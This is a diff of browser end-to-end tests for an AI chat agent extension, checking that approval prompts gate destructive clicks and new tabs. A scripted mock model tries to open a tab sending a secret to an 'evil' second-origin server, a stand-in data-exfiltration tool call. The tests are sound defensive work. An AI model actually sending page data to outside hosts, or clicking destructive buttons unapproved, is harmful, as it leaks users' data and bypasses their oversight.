@@ -15,6 +15,7 @@ import {
   restartAgent,
   startMockModel,
   startPageServer,
+  startServer,
   tempDir,
   toolResults,
   writeRestartHelper,
@@ -31,6 +32,9 @@ let model;
 let site;
 let segmentsFetches = 0;
 let helperDir;
+/** A server on another origin that should only ever see a request after Allow. */
+let evil;
+const evilRequests = [];
 
 before(async () => {
   model = await startMockModel();
@@ -39,6 +43,15 @@ before(async () => {
       <iframe src="/frame.html"></iframe>
       <script>setInterval(() => fetch("/api/segments.json").catch(() => {}), 150);</script>`,
     "/frame.html": "<!doctype html><button>inside frame</button>",
+    "/orders.html": `<!doctype html><title>count 0</title><h1>Orders</h1>
+      <form action="/orders/delete" method="post" onsubmit="event.preventDefault(); window.n = (window.n || 0) + 1; document.title = 'count ' + window.n">
+        <button type="submit">Delete</button>
+      </form>
+      <button onclick="document.title = 'details shown'">Show details</button>`,
+    "/full-delete.html": `<!doctype html><title>count 0</title>
+      <form action="/orders/delete" method="post" onsubmit="event.preventDefault(); window.n = (window.n || 0) + 1; document.title = 'count ' + window.n">
+        <button type="submit" style="position:fixed;inset:0;width:100vw;height:100vh">Delete</button>
+      </form>`,
     "/shop/p1.html": shopPage(1),
     "/shop/p2.html": shopPage(2),
     "/shop/p3.html": shopPage(3),
@@ -49,6 +62,12 @@ before(async () => {
       return JSON.stringify({ segments: [{ id: 1, name: "sales" }] });
     },
   });
+  evil = await startServer((req, res) => {
+    evilRequests.push(req.url);
+    res
+      .writeHead(200, { "content-type": "text/html" })
+      .end("<title>evil</title>");
+  });
   helperDir = writeRestartHelper(join(tempDir("apty-e2e-helper-"), "helper"));
   browser = await launchBrowser({ extraExtensions: [helperDir] });
 });
@@ -57,6 +76,7 @@ after(async () => {
   await browser?.close();
   model?.close();
   site?.close();
+  evil?.close();
 });
 
 async function openApp() {
@@ -392,5 +412,279 @@ describe("chat agent in a real browser", () => {
     assert.match(text, /"framesAccessible":2\b/, text.slice(0, 800));
     await panel.close();
     await app.close();
+  });
+});
+
+/**
+ * Run `steps` as consecutive tool calls in one chat turn on `path`. Each step
+ * is `(previousResults) => ({ tool, args })`.
+ */
+async function runGatedSteps(path, prompt, steps, whileWaiting) {
+  const app = await browser.context.newPage();
+  await app.goto(`${site.origin}${path}`);
+  const panel = await openSidePanel(browser, model, app);
+  // Count this turn's tool calls rather than tool messages: a screenshot
+  // sent to the model arrives as a new user message, which resets
+  // `toolResults`.
+  model.script((request) => {
+    const turn = messagesSincePrompt(request, prompt);
+    if (!turn) return { text: "unrelated request" };
+    const index = turn.filter(
+      (m) => m.role === "assistant" && m.tool_calls,
+    ).length;
+    const step = steps[index]?.(toolResultsSincePrompt(request, prompt));
+    if (!step) {
+      return {
+        text: `RESULT: ${JSON.stringify(toolResults(request).at(-1)).slice(0, 300)}`,
+      };
+    }
+    const offered = (request.tools ?? []).map((t) => t.function.name);
+    if (!offered.includes(step.tool)) {
+      return { text: `RESULT: ${step.tool} was not offered for this request` };
+    }
+    return step;
+  });
+  await chatAndWait(panel, prompt, {
+    timeout: 120_000,
+    whileWaiting: whileWaiting?.(panel),
+  });
+  const results = toolResultsSincePrompt(model.requests.at(-1), prompt);
+  assert.equal(
+    results.length,
+    steps.length,
+    await panel.locator("body").innerText(),
+  );
+  return { app, panel, results };
+}
+
+/** The messages after the user message that sent `prompt`, or null when it is not in `request`. */
+function messagesSincePrompt(request, prompt) {
+  const messages = request.messages ?? [];
+  const start = messages.findLastIndex(
+    (m) =>
+      m.role === "user" &&
+      (typeof m.content === "string"
+        ? m.content
+        : JSON.stringify(m.content)
+      ).includes(prompt),
+  );
+  return start === -1 ? null : messages.slice(start + 1);
+}
+
+/** Every tool result after the user message that sent `prompt`. */
+function toolResultsSincePrompt(request, prompt) {
+  return (messagesSincePrompt(request, prompt) ?? [])
+    .filter((m) => m.role === "tool")
+    .map((m) => {
+      const text =
+        typeof m.content === "string" ? m.content : JSON.stringify(m.content);
+      try {
+        return JSON.parse(text);
+      } catch {
+        return text;
+      }
+    });
+}
+
+function findUid(searchResult, label) {
+  const text =
+    typeof searchResult === "string"
+      ? searchResult
+      : JSON.stringify(searchResult);
+  const line = text.split(/\\n|\n/).find((l) => l.includes(label));
+  return line?.match(/uid=([\w-]+)/)?.[1] ?? line?.match(/\[([\w-]+)\]/)?.[1];
+}
+
+const tabIdOf = (tab) => tab.tab?.id ?? tab.id;
+
+/** Steps that find `label` on the current tab and click it. */
+function clickSteps(label) {
+  return [
+    () => ({ tool: "get_current_tab", args: {} }),
+    ([tab]) => ({
+      tool: "search_elements",
+      args: { tabId: tabIdOf(tab), query: label, contextLevels: 0 },
+    }),
+    ([tab, search]) => ({
+      tool: "click",
+      args: {
+        tabId: tabIdOf(tab),
+        uid: findUid(search, label),
+        dblClick: false,
+      },
+    }),
+  ];
+}
+
+/** Answer the approval prompt with `button` after checking its text. */
+function answerGate(button, check) {
+  return (panel) => async () => {
+    const prompt = panel.getByRole("alertdialog");
+    await prompt.waitFor({ timeout: 60_000 });
+    await check?.(await prompt.innerText(), prompt);
+    await prompt.getByRole("button", { name: button }).click();
+  };
+}
+
+describe("approval for clicks and new tabs (A1)", () => {
+  const secret = "s".repeat(200);
+
+  it("never opens a tab carrying page data to another origin when the user clicks Deny", async () => {
+    const exfil = `${evil.origin}/?d=${secret}`;
+    const { app, panel, results } = await runGatedSteps(
+      "/app.html",
+      "open a new tab with the help page",
+      [() => ({ tool: "create_new_tab", args: { url: exfil } })],
+      answerGate("Deny", async (text, prompt) => {
+        assert.match(text, /create_new_tab/);
+        assert.ok(text.includes(secret), "the prompt shows the full URL");
+        assert.equal(
+          await prompt
+            .getByRole("button", { name: /Allow on this site/ })
+            .count(),
+          0,
+          "a URL carrying data is never remembered",
+        );
+      }),
+    );
+
+    assert.equal(results[0].status, "denied");
+    await new Promise((r) => setTimeout(r, 500));
+    assert.deepEqual(evilRequests, []);
+    await panel.close();
+    await app.close();
+  });
+
+  it("opens that tab only after Allow once", async () => {
+    const exfil = `${evil.origin}/?d=${secret}`;
+    const { app, panel, results } = await runGatedSteps(
+      "/app.html",
+      "open a new tab with the help page",
+      [() => ({ tool: "create_new_tab", args: { url: exfil } })],
+      answerGate("Allow once"),
+    );
+
+    assert.equal(results[0].success, true, JSON.stringify(results[0]));
+    const deadline = Date.now() + 10_000;
+    while (evilRequests.length === 0 && Date.now() < deadline) {
+      await new Promise((r) => setTimeout(r, 100));
+    }
+    assert.ok(evilRequests.some((u) => u.includes(secret)));
+    for (const page of browser.context.pages()) {
+      if (page.url().startsWith(evil.origin)) await page.close();
+    }
+    evilRequests.length = 0;
+    await panel.close();
+    await app.close();
+  });
+
+  it("clicks a benign button with no prompt", async () => {
+    const { app, panel, results } = await runGatedSteps(
+      "/orders.html",
+      "on the current tab, click the Show details button",
+      clickSteps("Show details"),
+    );
+
+    assert.notEqual(results[2].success, false, JSON.stringify(results[2]));
+    assert.equal(await app.title(), "details shown");
+    assert.equal(await panel.getByRole("alertdialog").count(), 0);
+    await panel.close();
+    await app.close();
+  });
+
+  it("asks before clicking a Delete submit button, and Deny leaves the page unchanged", async () => {
+    const { app, panel, results } = await runGatedSteps(
+      "/orders.html",
+      "on the current tab, click the Delete button",
+      clickSteps("Delete"),
+      answerGate("Deny", (text) => {
+        assert.match(text, /Allow click\?/);
+        assert.match(text, /Click "Delete"/);
+        assert.match(text, /Form: POST .*\/orders\/delete/);
+        assert.match(text, /it submits a form/);
+      }),
+    );
+
+    assert.equal(results[2].status, "denied");
+    assert.equal(await app.title(), "count 0");
+    await panel.close();
+    await app.close();
+  });
+
+  it("asks before a coordinate click on the same button", async () => {
+    const { app, panel, results } = await runGatedSteps(
+      "/full-delete.html",
+      "take a screenshot of the current tab, then use the computer to click the middle of the page",
+      [
+        () => ({ tool: "capture_screenshot", args: { sendToLLM: true } }),
+        () => ({
+          tool: "computer",
+          args: { action: "left_click", coordinate: [200, 150] },
+        }),
+      ],
+      answerGate("Deny", (text) => {
+        assert.match(text, /Allow computer\?/);
+        assert.match(text, /Click "Delete"/);
+      }),
+    );
+
+    assert.equal(results[1].status, "denied", JSON.stringify(results[1]));
+    assert.equal(await app.title(), "count 0");
+    await panel.close();
+    await app.close();
+  });
+
+  it("an 'Allow on this site' for click does not cover create_new_tab, and revoking it asks again", async () => {
+    const first = await runGatedSteps(
+      "/orders.html",
+      "on the current tab, click the Delete button",
+      clickSteps("Delete"),
+      answerGate(/Allow on this site/),
+    );
+    assert.equal(await first.app.title(), "count 1");
+    await first.panel.close();
+    await first.app.close();
+
+    const again = await runGatedSteps(
+      "/orders.html",
+      "on the current tab, click the Delete button again",
+      clickSteps("Delete"),
+    );
+    assert.equal(await again.app.title(), "count 1", "remembered: no prompt");
+    await again.panel.close();
+    await again.app.close();
+
+    const tab = await runGatedSteps(
+      "/orders.html",
+      "open a new tab with the help page",
+      [
+        () => ({
+          tool: "create_new_tab",
+          args: { url: `${evil.origin}/help` },
+        }),
+      ],
+      answerGate("Deny", (text) => assert.match(text, /create_new_tab/)),
+    );
+    assert.equal(tab.results[0].status, "denied");
+    assert.deepEqual(evilRequests, []);
+    await tab.panel.close();
+    await tab.app.close();
+
+    const options = await extensionPage(browser);
+    await options.getByText(/click/).first().waitFor();
+    await options.getByRole("button", { name: "Revoke all" }).click();
+    await options.getByText("No active approvals.").waitFor();
+    await options.close();
+
+    const revoked = await runGatedSteps(
+      "/orders.html",
+      "on the current tab, click the Delete button once more",
+      clickSteps("Delete"),
+      answerGate("Deny"),
+    );
+    assert.equal(revoked.results[2].status, "denied");
+    assert.equal(await revoked.app.title(), "count 0");
+    await revoked.panel.close();
+    await revoked.app.close();
   });
 });
